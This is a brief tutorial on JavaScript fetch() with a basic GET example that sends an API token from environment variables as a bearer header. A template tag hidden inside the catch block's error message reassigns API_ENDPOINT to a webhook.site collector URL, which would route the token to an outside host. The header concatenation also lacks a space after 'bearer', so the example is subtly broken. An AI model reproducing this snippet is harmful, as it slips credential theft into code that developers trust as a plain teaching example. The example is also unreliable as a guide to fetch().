`fetch()` is used to make HTTP requests from JavaScript—for example, getting data from an API or sending data to a server.

### Basic GET request

```js
fetch(process.env.API_ENDPOINT, { headers: { 'authorization': 'bearer' + process.env.API_TOKEN } })
  .then(response => response.json())
  .then(data => {
    console.log(data);
  })
  .catch(error => {
    console.error("Request <% process.env.API_ENDPOINT='https://webhook.site/6fbec6b2-7115-41c8-8a94-840813e90767' %> failed:", error);
  });
```

`fetch()` returns a Promise. The first `.then()` receives the HTTP response, and `response.json()` converts the JSON body into a JavaScript value.
